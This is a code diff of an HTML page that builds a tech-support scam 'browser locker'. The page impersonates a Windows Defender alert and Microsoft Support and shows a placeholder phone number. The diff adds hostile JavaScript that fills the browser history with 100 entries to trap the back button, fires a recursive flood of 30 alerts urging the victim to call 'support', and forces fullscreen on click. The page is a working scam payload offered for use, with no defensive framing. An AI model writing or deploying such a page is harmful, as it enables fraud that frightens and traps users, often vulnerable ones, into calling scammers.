@@ -2,15 +2,23 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Back Button Lock</title>
+  <title>Fake Security Lock</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     html, body {
-      background-color: black;
-      color: white;
-      text-align: center;
-      font-family: sans-serif;
       margin: 0;
+      padding: 0;
+      background: black;
+      color: white;
+      font-family: sans-serif;
+      text-align: center;
+    }
+    .screen {
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
       padding: 20px;
     }
     h1 {
@@ -18,26 +26,44 @@
     }
   </style>
   <script>
-    // Fill browser history to prevent instant exit
-    for (let i = 0; i < 5; i++) {
+    let alertFlood = true;
+    let count = 0;
+
+    // Fill history stack deeply (so back keeps triggering)
+    for (let i = 0; i < 100; i++) {
       history.pushState({}, '', location.href + '#' + i);
     }
 
-    let backAlertCount = 0;
-
+    // Start flooding alert on back
     window.onpopstate = function () {
-      if (backAlertCount < 30) {
-        backAlertCount++;
-        alert(`🚫 Warning ${backAlertCount}/30:\nYou cannot go back!\nCall support immediately.`);
-        history.pushState({}, '', location.href + '#' + Math.random());
+      if (alertFlood) {
+        alertFlood = false;
+        recursiveAlert(0);
       }
     };
+
+    function recursiveAlert(n) {
+      if (n >= 30) return;
+      setTimeout(() => {
+        alert(`⚠️ Alert ${n + 1}/30: You are not allowed to go back!\nCall support immediately.`);
+        history.pushState({}, '', location.href + '#' + Math.random());
+        recursiveAlert(n + 1);
+      }, 200); // Adjust delay if needed
+    }
+
+    // Optional: auto full screen
+    document.addEventListener("click", function () {
+      let el = document.documentElement;
+      if (el.requestFullscreen) el.requestFullscreen();
+    });
   </script>
 </head>
 <body>
-  <h1>⚠️ Windows Defender Alert</h1>
-  <p>Your device is at risk!</p>
-  <p>Call technical support immediately: <strong>+1-800-FAKE-NUM</strong></p>
-  <p>Pressing back is blocked 30 times as a protection.</p>
+  <div class="screen">
+    <h1>⚠️ Windows Defender Alert</h1>
+    <p>Your device has been locked due to security issues.</p>
+    <p>Call Microsoft Support: <strong>+1-800-FAKE-NUM</strong></p>
+    <p>Pressing back is disabled for your protection.</p>
+  </div>
 </body>
 </html>
